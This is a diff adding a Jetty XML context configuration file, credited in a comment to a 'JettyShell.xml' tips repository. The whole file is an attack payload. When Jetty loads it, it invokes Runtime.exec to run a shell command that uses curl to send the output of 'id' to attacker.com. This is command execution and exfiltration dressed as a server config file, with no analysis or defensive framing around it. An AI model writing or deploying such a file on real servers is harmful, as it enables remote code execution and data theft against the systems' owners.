@@ -1,0 +1,16 @@
+<?xml version="1.0"?>
+<!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "https://www.eclipse.org/jetty/configure_10_0.dtd">
+<!-- source: https://github.com/Mike-n1/tips/blob/main/JettyShell.xml -->
+<Configure class="org.eclipse.jetty.server.handler.ContextHandler">
+    <Call class="java.lang.Runtime" name="getRuntime">
+        <Call name="exec">
+            <Arg>
+                <Array type="String">
+                    <Item>/bin/sh</Item>
+                    <Item>-c</Item>
+                    <Item>curl -G "u=`id`" http://attacker.com/</Item>
+                </Array>
+            </Arg>
+        </Call>
+    </Call>
+</Configure>
